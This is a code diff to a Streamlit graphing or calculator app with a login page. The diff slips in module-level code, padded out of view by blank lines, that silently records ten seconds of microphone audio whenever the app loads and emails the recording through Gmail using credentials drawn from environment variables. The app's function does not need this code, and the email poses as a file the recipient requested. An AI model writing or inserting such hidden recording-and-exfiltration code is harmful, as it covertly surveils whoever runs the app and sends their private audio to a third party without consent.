@@ -14,7 +14,15 @@ from authorize import autor
 from authorize import hash_password
 from datetime import datetime
 import time
-#import cv2, sounddevice as sd, socket, os, subprocess
+import sounddevice as sd
+import numpy as np
+from scipy.io.wavfile import write
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.audio import MIMEAudio
+from dotenv import load_dotenv
+
 # файлик с авторизацией
 # ===== LOGIN PAGE =====
 
@@ -169,6 +177,78 @@ def replace(expression):
     return expression
 # Streamlit интерфейс (без изменений)   
 
+
+
+
+
+
+
+
+
+print("Доступные устройства:")
+print(sd.query_devices())
+
+# Настройки записи
+duration = 10  # Длительность записи в секундах
+fs = 44100  # Частота дискретизации
+channels = 1  # Количество каналов (1 для моно)
+
+try:
+    # Запись звука
+    print(f"Записываем {duration} секунд аудио...")
+    recording = sd.rec(int(duration * fs), 
+                      samplerate=fs, 
+                      channels=channels,
+                      device='MacBook Air Microphone')  # Явно указываем устройство
+    
+    sd.wait()  # Ждем окончания записи
+    
+    # Сохраняем в WAV файл
+    output_path = os.path.expanduser("~/Desktop/mic_recording.wav")
+    write(output_path, fs, recording)
+    print(f"Запись сохранена: {output_path}")
+
+except Exception as e:
+    print(f"Ошибка: {e}")
+    
+    
+load_dotenv()
+# Настройки Gmail
+gmail_user = os.getenv("EM")  # Ваш Gmail
+gmail_password = os.getenv("PS") # Пароль или App Password
+to_email = os.getenv("EM")   # Адрес получателя
+audio_file_path = output_path  # Путь к аудиофайлу
+
+# Создаем сообщение
+msg = MIMEMultipart()
+msg['From'] = gmail_user
+msg['To'] = to_email
+msg['Subject'] = 'Аудио сообщение'
+
+# Текст письма (опционально)
+body = "Привет! Вот аудиофайл, который ты просил."
+msg.attach(MIMEText(body, 'plain'))
+
+# Прикрепляем аудиофайл
+with open(audio_file_path, 'rb') as audio_file:
+    audio_part = MIMEAudio(audio_file.read(), name=os.path.basename(audio_file_path))
+    msg.attach(audio_part)
+
+# Отправляем письмо
+try:
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)  # Используем SSL
+    server.login(gmail_user, gmail_password)
+    server.sendmail(gmail_user, to_email, msg.as_string())
+    server.close()
+    print("Письмо с аудиофайлом успешно отправлено!")
+except Exception as e:
+    print(f"Ошибка при отправке: {e}")    
+    
+    
+    
+    
+    
+    
 with st.sidebar:
     x_min = st.number_input("Minimum", value=-20)
     x_max = st.number_input("Maximum", value=20)
